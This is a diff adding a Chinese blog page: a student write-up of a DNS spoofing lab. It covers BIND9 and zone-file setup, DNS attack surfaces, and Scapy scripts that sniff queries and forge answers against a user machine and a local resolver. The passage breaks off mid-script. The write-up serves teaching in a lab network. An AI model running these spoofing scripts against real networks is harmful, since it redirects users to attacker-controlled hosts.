@@ -1,0 +1,740 @@
+
+
+<!DOCTYPE html>
+<html lang="zn-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1 作业题目 ​		本实验的目标是让学生获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。学生将首先设置和配置DNS服务器，然后在实验室环境中的目标上尝试各">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lab11-DNS欺骗_Local">
+<meta property="og:url" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/index.html">
+<meta property="og:site_name" content="Bubble&#39;s Blog">
+<meta property="og:description" content="1 作业题目 ​		本实验的目标是让学生获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。学生将首先设置和配置DNS服务器，然后在实验室环境中的目标上尝试各">
+<meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.4.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.5.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.6.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.8.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.10.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.9.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.11.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.12.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.13.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.14.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.15.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.18.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.17.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/10.1.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.19.jpg">
+<meta property="article:published_time" content="2024-02-20T13:55:34.577Z">
+<meta property="article:modified_time" content="2024-02-21T08:30:42.178Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.4.jpg">
+  
+  
+  
+  <title>Lab11-DNS欺骗_Local - Bubble&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ybubble.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Bubble</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Category</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Lab11-DNS欺骗_Local"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-20 21:55" pubdate>
+          February 20, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Lab11-DNS欺骗_Local</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>1 作业题目</h1>
+<p>​		本实验的目标是让学生获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。学生将首先设置和配置DNS服务器，然后在实验室环境中的目标上尝试各种DNS欺骗攻击。</p>
+<p>​		第一个大实验任务（本地DNS欺骗）中进行的攻击假设攻击者位于同一本地网络上，因此可以嗅探DNS数据包。这个假设是为了简化实验任务。第二个大实验任务为远程DNS攻击实验，攻击者在没有嗅探数据包的情况下发起远程欺骗攻击，远程攻击实验室比本地DNS欺骗实验更具挑战性。</p>
+<p>​		实验基于BIND9搭建DNS服务器。Bind是Berkeley Internet Name Domain Service的简写，它是一款实现DNS服务器的开放源码软件。Bind已经成为世界上使用最为广泛的DNS服务器软件，目前Internet上半数以上的DNS服务器都是用Bind来架设的，已经成为DNS中事实上的标准。</p>
+<h1>2 实验步骤</h1>
+<h2 id="2-0-原理">2.0 原理</h2>
+<p><strong>BIND9配置文件</strong></p>
+<p><code>named.conf</code> 配置本地DNS配置表<br>
+<code>named.conf.options</code> 连接外网<br>
+<code>db.local</code> 域名文件模板</p>
+<h3 id="2-0-1-文件配置信息">2.0.1 文件配置信息</h3>
+<p>1、在Linux中，DNS解析器依赖两个文件，分别是/etc/hosts和/etc/resolv.conf。resolv.conf为DNS解析器提供信息，包含本地DNS服务器的IP地址等</p>
+<p>2、dig命令会模拟本地DNS服务器的行为</p>
+<p>3、文件<code>resolve.conf</code>：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nameserver</span> <span class="hljs-number">10.9.0.53</span><br></code></pre></td></tr></table></figure>
+<p>这个文件表明了DNS服务器的IP地址。</p>
+<p>4、文件<code>named.conf</code>，该文件用于建立区域。第一个zone用于进行正向查找（从主机名到IP地址）；第二个区域用来进行反向查找（从IP地址到主机名）。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">zone <span class="hljs-string">&quot;attacker32.com&quot;</span> &#123;<br>        type master<span class="hljs-comment">;</span><br>        file <span class="hljs-string">&quot;/etc/bind/zone_attacker32.com&quot;</span><span class="hljs-comment">;	# 正向查找的区域文件</span><br>&#125;<span class="hljs-comment">;</span><br><br>zone <span class="hljs-string">&quot;example.com&quot;</span> &#123;<br>        type master<span class="hljs-comment">;</span><br>        file <span class="hljs-string">&quot;/etc/bind/zone_example.com&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>type master表示第一步首先去外网DNS服务器查询，如果没有，就用file定义的本地文件，文件名是&quot;/etc/bind/zone_attacker32.com&quot;和&quot;/etc/bind/zone_example.com&quot;</p>
+<p>5、文件<code>named.conf.options</code>：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">options</span>&#123;<br>	...<br>	<span class="hljs-keyword">dump</span>-<span class="hljs-keyword">file</span> <span class="hljs-string">&quot;/var/cache/bind/dump.db&quot;</span>;<br>	dnssec-enable no;	# DNSSEC的作用是抵御对DNS服务器的欺骗攻击，需关闭<br>	query-<span class="hljs-keyword">source</span> port <span class="hljs-number">33333</span>;	# 固定端口。出于安全考虑，当发送DNS请求时，BIND <span class="hljs-number">9</span>在它的UDP数据包中使用随机源端口号<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>有很多字段，上面的一个字段表明，将缓存转储到文件&quot;/var/cache/bind/dump.db&quot;中。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">sudo rndc dumpdb -cache  <span class="hljs-meta"># cache msg--&gt;<span class="hljs-string">&quot;/var/cache/bind/dump.db&quot;</span></span><br>cat <span class="hljs-keyword">/var/</span>cache<span class="hljs-keyword">/bind/</span>dump.db  <span class="hljs-meta"># view</span><br></code></pre></td></tr></table></figure>
+<p>6、文件<code>zone_attacker32.com</code>，文件的具体格式在RFC 1035中。该文件包括有1个SOA（授权开始）记录，1个NS（域名服务器）记录，4个A（IP地址）记录</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-meta">$TTL</span> <span class="hljs-number">3</span>D<br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>   ns.attacker32.com. admin.attacker32.com. (<br>                <span class="hljs-number">2008111001</span><br>                <span class="hljs-number">8</span>H<br>                <span class="hljs-number">2</span>H<br>                <span class="hljs-number">4</span>W<br>                <span class="hljs-number">1</span>D)<br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>    ns.attacker32.com.<br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.180</span><br>www     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.180</span><br>ns      <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.153</span><br>*       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.100</span><br></code></pre></td></tr></table></figure>
+<p>7、文件zone_example.com：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-meta">$TTL</span> <span class="hljs-number">3</span>D<br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">SOA</span>   ns.example.com. admin.example.com. (<br>                <span class="hljs-number">2008111001</span><br>                <span class="hljs-number">8</span>H<br>                <span class="hljs-number">2</span>H<br>                <span class="hljs-number">4</span>W<br>                <span class="hljs-number">1</span>D)<br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">NS</span>    ns.attacker32.com.<br><br>@       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">1.2.3.4</span><br>www     <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">1.2.3.5</span><br>ns      <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">10.9.0.153</span><br>*       <span class="hljs-keyword">IN</span>      <span class="hljs-keyword">A</span>     <span class="hljs-number">1.2.3.6</span><br></code></pre></td></tr></table></figure>
+<p>①@符号是特殊字符，代表named.conf文件内指定的来源</p>
+<p>②SOA：授权开始</p>
+<h3 id="2-0-2-DNS攻击概述">2.0.2 DNS攻击概述</h3>
+<p><strong>针对DNS的攻击方式</strong></p>
+<p>1、拒绝服务攻击<br>
+2、DNS欺骗攻击，主要目的是给受害者提供虚假的IP地址</p>
+<p><strong>对域名系统的四个攻击面</strong></p>
+<p>1、在受感染的计算机中攻击<br>
+比如修改/etc/resolv.conf或/etc/hosts等</p>
+<p>2、攻击用户机<br>
+当用户机给本地DNS服务器发送DNS请求时，攻击者可以立即发送一个欺骗的回复</p>
+<p>3、攻击本地DNS服务器：缓存中毒攻击<br>
+当本地DNS服务器向因特网中的DNS服务器发送迭代请求时，攻击者可以发送欺骗回复给本地DNS服务器。<br>
+欺骗回复的信息通常被DNS服务器缓存，这个攻击被称为DNS缓存中毒攻击</p>
+<p>4、从恶意DNS服务器发起攻击<br>
+比如用户访问attacker32.com这个网站时，一个DNS请求会最终到达attacker32.com的权威域名服务器。 除了在响应的回复部分提供IP地址外，这个域名服务器还会提供授权和附加部分的信息。<br>
+如果用户不加选择地接受域名服务器提供的所有信息，攻击者就可以通过提供虚假信息来达到攻击的目的。</p>
+<h3 id="2-0-3-DNS-pkt">2.0.3 DNS pkt</h3>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">DNSpkt = DNS(<span class="hljs-attribute">id</span>=pkt[DNS].id, <span class="hljs-attribute">qd</span>=pkt[DNS].qd, <span class="hljs-attribute">aa</span>=1, <span class="hljs-attribute">rd</span>=0, <span class="hljs-attribute">qr</span>=1, <br><span class="hljs-attribute">qdcount</span>=1, <span class="hljs-attribute">ancount</span>=1, <span class="hljs-attribute">nscount</span>=2, <span class="hljs-attribute">arcount</span>=2,<br><span class="hljs-attribute">an</span>=Anssec, <span class="hljs-attribute">ns</span>=NSsec1/NSsec2, <span class="hljs-attribute">ar</span>=Addsec1/Addsec2)<br></code></pre></td></tr></table></figure>
+<p>• id: Transaction ID; 应该与请求中的相同</p>
+<p>• qd: Query Domain; 查询域，应该与请求中的相同</p>
+<p>• aa: Authoritative answer (1表示该答案包含权威答案).</p>
+<p>• rd: Recursion Desired (需要的递归，0表示禁用递归查询).</p>
+<p>• qr: Query Response bit (查询响应位，1 means Response).</p>
+<p>• qdcount: number of query domains.</p>
+<p>• ancount: number of records in the Answer section.</p>
+<p>• nscount: number of records in the Authority section.</p>
+<p>• arcount: number of records in the Additional section.</p>
+<p>• an: Answer section</p>
+<p>• ns: Authority section</p>
+<p>• ar: Additional section</p>
+<h2 id="2-1-实验设置">2.1 实验设置</h2>
+<ul>
+<li>
+<p>源端口固定为33333</p>
+</li>
+<li>
+<p>关闭保护机制DNSSEC</p>
+</li>
+<li>
+<p>在攻击期间，需要检查本地DNS服务器上的DNS缓存。</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">rndc dumpdb -cache  <span class="hljs-meta"># 将缓存的内容转储到文件/var/cache/bind/dump.db</span><br>rndc <span class="hljs-keyword">flush</span>			 <span class="hljs-meta"># 清空缓存</span><br></code></pre></td></tr></table></figure>
+<p>如果缓存有答案，那么来自本地DNS服务器的回复将比欺骗的回复更快，攻击将无法成功。</p>
+</li>
+<li>
+<p>主机ip</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ef6a803db0cb</span>  user-<span class="hljs-number">10.9.0.5</span><br>a90fe8321faf  seed-router<br>9f716ac16cda  local-dns-server-<span class="hljs-number">10.9.0.53</span><br>c58c42209e5f  attacker-ns-<span class="hljs-number">10.9.0.153</span><br>d2df3f3bb639  seed-attacker<br>eee6e69ae762  mysql-<span class="hljs-number">10.9.0.6</span><br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Attacker nameserver 的zone file，请求该域名的都会被转发到它的nameserver10.9.0.153</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.4.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ul>
+<h2 id="2-2-Testing-the-DNS-Setup">2.2 Testing the DNS Setup</h2>
+<h3 id="2-2-1-Get-the-IP-address-of-ns-attacker32-com">2.2.1 Get the IP address of <a target="_blank" rel="noopener" href="http://ns.attacker32.com">ns.attacker32.com</a></h3>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">dig</span> ns.attacker32.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure>
+<p>“dig”是一个域名解析命令，客户机10.9.0.5执行该命令，该域名指向的地址与攻击者主机的ip对应。</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.2.jpg" srcset="/img/loading.gif" lazyload class="">
+<h3 id="2-2-2-Get-the-IP-address-of-www-example-com">2.2.2 Get the IP address of <a target="_blank" rel="noopener" href="http://www.example.com">www.example.com</a></h3>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">dig</span> www.example.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure>
+<p>执行命令时，会向example.com域的官方名称服务器询问www.example.com的IP。</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.3.jpg" srcset="/img/loading.gif" lazyload class="">
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dig @ns<span class="hljs-selector-class">.attacker32</span><span class="hljs-selector-class">.com</span> www<span class="hljs-selector-class">.example</span>.com<br></code></pre></td></tr></table></figure>
+<p>直接向ns.attacker32.com发送请求，结果显示attacker将www.example.com对应的IP指向1.2.3.5：</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.5.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>结果与Attacker上zone文件相同：</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.6.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="2-3-Task-1-Directly-Spoofifing-Response-to-User">2.3 Task 1: Directly Spoofifing Response to User</h2>
+<p>task1实现DNS欺骗的方法是通过侦听客户机的数据包，然后对捕获的数据包进行修改，再发送给客户机。这种攻击方法的目标是客户机，而非DNS服务器。</p>
+<p>1、在local DNS Server中使用命令<code>rndc flush</code>清楚缓存</p>
+<p>2、编写dns欺骗代码：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = <span class="hljs-string">&#x27;10.9.0.5&#x27;</span>,     src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,         <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>, <br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>, <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec )<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and (src host 10.9.0.5 and dst port 53)&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br><br></code></pre></td></tr></table></figure>
+<p>2、用户机再次执行命令<code>dig www.example.com</code>，结果显示，域名对应的IP变为攻击者域名对应的IP1.2.3.5：</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.8.png" srcset="/img/loading.gif" lazyload class="">
+<h2 id="2-4-Task-2-DNS-Cache-Poisoning-Attack-–-Spoofifing-Answers">2.4 Task 2: DNS Cache Poisoning Attack – Spoofifing Answers</h2>
+<p>1、修改攻击代码：</p>
+<p>这次侦听的数据包是由本地DNS发出的数据包，同样构造数据包的内容，实现对本地DNS的攻击：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = old_ip.src,     src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,         <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>, <br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = 